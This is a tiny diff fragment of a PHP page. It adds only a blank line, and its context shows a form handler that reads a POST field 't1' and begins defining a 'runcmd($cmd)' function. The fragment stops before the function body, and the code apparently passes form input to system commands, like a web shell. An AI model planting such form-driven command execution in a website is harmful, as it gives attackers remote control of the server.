@@ -14,6 +14,7 @@
 		    </form>
       </div>
     </div>
+    
 <?php
 if (isset($_POST["t1"]) && !empty($_POST["t1"])) {
 function runcmd ($cmd){
